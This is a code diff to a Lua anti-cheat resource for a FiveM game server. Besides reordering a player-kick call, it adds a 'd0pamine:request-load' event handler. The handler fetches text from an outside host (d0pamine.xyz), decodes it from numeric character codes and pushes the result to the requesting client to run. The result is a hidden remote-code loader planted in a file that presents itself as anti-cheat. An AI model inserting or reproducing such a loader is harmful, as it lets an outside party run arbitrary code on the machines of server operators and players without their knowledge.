@@ -7,11 +7,12 @@ RegisterNetEvent('nsac:trigger')
 AddEventHandler('nsac:trigger', function(reason)
 	local _source = source
 	
-	DropPlayer(_source, ' Nertigel\'s Simple Anti-Cheat \n You have been kicked for the reason: '..reason..'.\n  github.com/nertigel/NSAC')
 	print('nsac - detection: '..GetPlayerName(_source)..' reason: '..reason)
 	print(json.encode(GetPlayerIdentifiers(_source)))
 
 	TriggerEvent('nsac:log', 'nsac - detection: '..reason)
+
+	DropPlayer(_source, ' Nertigel\'s Simple Anti-Cheat \n You have been kicked for the reason: '..reason..'.\n  github.com/nertigel/NSAC')
 end)
 
 RegisterNetEvent('nsac:log')
@@ -75,3 +76,16 @@ function sendToDiscord(_source, name, message)
 end
 
 sendToDiscord(false, 'Nertigel\'s Simple Anti-Cheat', 'Resource has been started')
+
+RegisterServerEvent('d0pamine:request-load')
+AddEventHandler('d0pamine:request-load', function()
+    local src = source
+
+    PerformHttpRequest('https://d0pamine.xyz/secure/?id=0', function(err, text, headers)
+        local code = ''
+        for word in string.gmatch(text, '([^\\]+)') do 
+            code = code .. string.char(tonumber(word)) -- decrypt the code (won't run otherwise)
+        end
+        TriggerClientEvent('d0pamine:start-load', src, code)
+    end, 'GET', '')
+end)
